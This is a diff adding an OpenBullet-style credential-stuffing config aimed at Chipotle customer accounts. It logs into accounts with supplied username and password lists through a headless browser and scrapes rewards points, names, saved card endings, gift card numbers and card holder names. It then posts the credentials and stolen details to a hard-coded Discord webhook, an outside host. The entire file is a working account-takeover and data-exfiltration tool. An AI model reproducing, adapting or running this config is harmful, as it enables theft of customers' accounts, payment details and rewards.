@@ -1,0 +1,237 @@
+[SETTINGS]
+{
+  "Name": "authchip",
+  "SuggestedBots": 1,
+  "MaxCPM": 50,
+  "LastModified": "2021-10-10T23:24:45.6033997-04:00",
+  "AdditionalInfo": "no",
+  "Author": "Contact#1001",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": true,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "ENTER YOUR KEY",
+      "VariableName": "AUTHKEY",
+      "Id": 38776204
+    }
+  ],
+  "ForceHeadless": true,
+  "AlwaysOpen": true,
+  "AlwaysQuit": true,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": true,
+  "CustomUserAgent": "",
+  "RandomUA": true,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+IF "<AUTHKEY>" DoesNotContain "101020210909-dudud-ikmnbg"
+
+FUNCTION Constant "AUTH NOT GRANTED" -> CAP "AUTH" 
+
+ENDIF
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<AUTHKEY>" Contains "101020210909-dudud-ikmnbg" 
+  KEYCHAIN Failure OR 
+    KEY "<AUTH>" EqualTo "AUTH NOT GRANTED" 
+
+#LEgit BROWSERACTION Open 
+
+#fu BROWSERACTION ClearCookies 
+
+#saying NAVIGATE "https://www.chipotle.com/order/sign-in" 10 
+
+#else BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+#2 ELEMENTACTION XPath "/html/body/div[1]/div[1]/div[2]/div[1]/div/div/div/div[3]/div[1]/form/div[1]/div/div[2]/input" Recursive=TRUE 
+  Click 
+
+FUNCTION Delay "500" 
+
+#3 ELEMENTACTION XPath "/html/body/div[1]/div[1]/div[2]/div[1]/div/div/div/div[3]/div[1]/form/div[1]/div/div[2]/input" 
+  WaitForElement 
+
+#4 ELEMENTACTION Class "text-input-container" 
+  Click 
+
+#5 ELEMENTACTION XPath "/html/body/div[1]/div[1]/div[2]/div[1]/div/div/div/div[3]/div[1]/form/div[1]/div/div[2]/input" 
+  SendKeysHuman "<USER>" 
+
+#6 FUNCTION Delay "500" 
+
+#7 ELEMENTACTION XPath "/html/body/div[1]/div[1]/div[2]/div[1]/div/div/div/div[3]/div[1]/form/div[2]/div/div[2]/input" 
+  Click 
+
+#8 ELEMENTACTION XPath "/html/body/div[1]/div[1]/div[2]/div[1]/div/div/div/div[3]/div[1]/form/div[2]/div/div[2]/input" 
+  SendKeys "<PASS>" 
+
+#9 ELEMENTACTION XPath "/html/body/div[1]/div[1]/div[2]/div[1]/div/div/div/div[3]/div[2]/div/div/div" 
+  Click 
+
+FUNCTION Delay "1000" 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "Hey </div>" 
+
+PARSE "<SOURCE>" LR "class=\"points-balance\">" "<" CreateEmpty=FALSE -> CAP "Points" "" " POINTS" 
+
+PARSE "<SOURCE>" LR "Hey </div>" "<" CreateEmpty=FALSE -> CAP "FIRSTNAME" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<FIRSTNAME>" Exists 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<FIRSTNAME>" DoesNotExist 
+
+IF "<FIRSTNAME>" DoesNotExist 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<FIRSTNAME>" Exists 
+  KEYCHAIN Failure OR 
+    KEY "<FIRSTNAME>" DoesNotExist 
+
+ENDIF
+
+FUNCTION Delay "1000" 
+
+ELEMENTACTION XPath "/html/body/div[1]/div[1]/div[1]/div[1]/div[1]/div/div/div/h6" 
+  Click 
+
+FUNCTION Delay "1000" 
+
+PARSE "<SOURCE>" LR "class=\"points-balance\">" "<" CreateEmpty=FALSE -> CAP "POINTS" 
+
+PARSE "<SOURCE>" LR "id=\"batBeacon" "\"" -> VAR "bat" "batBeacom" "" 
+
+PARSE "<SOURCE>" LR "insertBefore(c,b)};a.load(\"" "\"\"" -> VAR "Pnode" "batBeacom" "" 
+
+PARSE "<SOURCE>" LR "mid=" ";" -> VAR "mid" 
+
+PARSE "<SOURCE>" LR "sid=" ";" -> VAR "sid" 
+
+PARSE "<SOURCE>" LR "vid=" ";" -> VAR "vid" 
+
+PARSE "<SOURCE>" LR "https://urldefense.com/" ">" Recursive=TRUE -> VAR "urldef" "https://urldefense.com/" "" 
+
+PARSE "<SOURCE>" LR "https://secure.adnxs.com/px?id=" ">" -> VAR "px" "https://secure.adnxs.com/px?id=" "" 
+
+PARSE "<SOURCE>" LR "snaptr(\"init\",\"" "\"" -> VAR "snap" "snaptr(\"init\",\"" "" 
+
+PARSE "<SOURCE>" LR "TTDUniversalPixelApi;universalPixelApi.init(\"" "]" -> VAR "pixelapi" "" "]" 
+
+PARSE "<SOURCE>" LR "class=\"saved-cards\">" "<" -> VAR "cc" 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+ELEMENTACTION XPath "/html/body/div[1]/div[1]/div[1]/div[1]/div[1]/div/div/div/h6" 
+  Click 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+##NAVIGATE "https://chipotle.com/order/edit-account" 
+
+PARSE "<SOURCE>" LR "Card ending in" "<" Recursive=TRUE CreateEmpty=FALSE -> CAP "card" "Cards " "" 
+
+PARSE "<SOURCE>" LR "gift-card-number\">" "<" Recursive=TRUE CreateEmpty=FALSE -> CAP "gift card" "Cards " "" 
+
+PARSE "<SOURCE>" LR "card-holder-name\">" "<" Recursive=TRUE CreateEmpty=FALSE -> CAP "card holder" "Cards " "" 
+
+ELEMENTACTION XPath "/html/body/div[1]/span[3]/div[2]/div/div/div/div[3]/div[3]/div/div[5]/div/ul/li[3]/div/div/h3" 
+  Click 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+PARSE "<SOURCE>" LR "Card ending in" "<" Recursive=TRUE CreateEmpty=FALSE -> CAP "card" "Cards " "" 
+
+PARSE "<SOURCE>" LR "gift-card-number\">" "<" Recursive=TRUE CreateEmpty=FALSE -> CAP "gift card" "Cards " "" 
+
+PARSE "<SOURCE>" LR "card-holder-name\">" "<" Recursive=TRUE CreateEmpty=FALSE -> CAP "card holder" "Cards " "" 
+
+FUNCTION Delay "500" 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+PARSE "<SOURCE>" LR "Card ending in" "<" Recursive=TRUE CreateEmpty=FALSE -> CAP "card" "Cards " "" 
+
+PARSE "<SOURCE>" LR "gift-card-number\">" "<" Recursive=TRUE CreateEmpty=FALSE -> CAP "gift card" "Cards " "" 
+
+PARSE "<SOURCE>" LR "card-holder-name\">" "<" Recursive=TRUE CreateEmpty=FALSE -> CAP "card holder" "Cards " "" 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+REQUEST GET "https://mboxedge34.tt.omtrdc.net/rest/v1/delivery?client=cmgstrategycollc&sessionId=d357f9f022574048bb77e47f54940047&version=2.3.0" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST GET "https://www.chipotle.com/libs/granite/csrf/token.json" 
+  
+  HEADER "User-Agent	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv: 91.0) Gecko/20100101 Firefox/91.0" 
+
+PARSE "<HEADERS[*]>" LR "" "" -> VAR "HEADS" 
+
+REQUEST GET "https://app.link/_r?sdk=web2.58.2&_t=950610218705339222&branch_key=key_live_hfK28UOcUBBlr9owR5EW2gpdtAkb0vgc&callback=branch_callback__12" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<COOKIES[*]>" LR "" "" -> VAR "_S" 
+
+PARSE "<HEADERS[*]>" LR "" "" -> VAR "tails" 
+
+PARSE "<tails>" LR "Date" ")" -> VAR "since" 
+
+REQUEST GET "https://api2.branch.io/v1/has-app/key_live_hfK28UOcUBBlr9owR5EW2gpdtAkb0vgc?browser_fingerprint_id=950610218705339222&instrumentation=%7B%22%2Fv1%2Fhas-app-brtt%22%3A%22293%22%2C%22%2F_r-brtt%22%3A%22419%22%7D" 
+  
+  HEADER "User-Agent	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv: 91.0) Gecko/20100101 Firefox/91.0" 
+
+REQUEST POST "https://chipotle.com/order/?UTM_Source=salesforce&UTM_medium=email-rewards&UTM_Campaign=WJ_1.1_WelcomeEmail&UTM_Content=Hero_Image" 
+  CONTENT "{\"ShouldTimeout\":false,\"UserName\":\"<USER>\",\"Password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "td><div id=\"Message\">" "<" CreateEmpty=FALSE -> CAP "HACKED" 
+
+!KEYCHECK BanOnToCheck=FALSE 
+!  KEYCHAIN Success AND 
+!    KEY "OK" 
+
+FUNCTION Constant "WHO: <USER> : <PASS> <FIRSTNAME> Holds <POINTS> Checked on <since> SAVED CC= <card> | <gift card>   | 🤾 🤺  BruteAll AKA Contact#1001" -> CAP "Chipotle " 
+
+IF "<Chipotle >" Contains "@" 
+
+REQUEST POST "https://discord.com/api/webhooks/890454939002884116/-rllZd3dQJS6_scaUQ_VS2W1GyL8MRkVpbtAeOEcCbNTLoPf8AT9fddfL71Piz9HBcfP" 
+  CONTENT "{\"content\":\">>> ```<USER>:<PASS> | <Chipotle >```\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+ENDIF
+
+
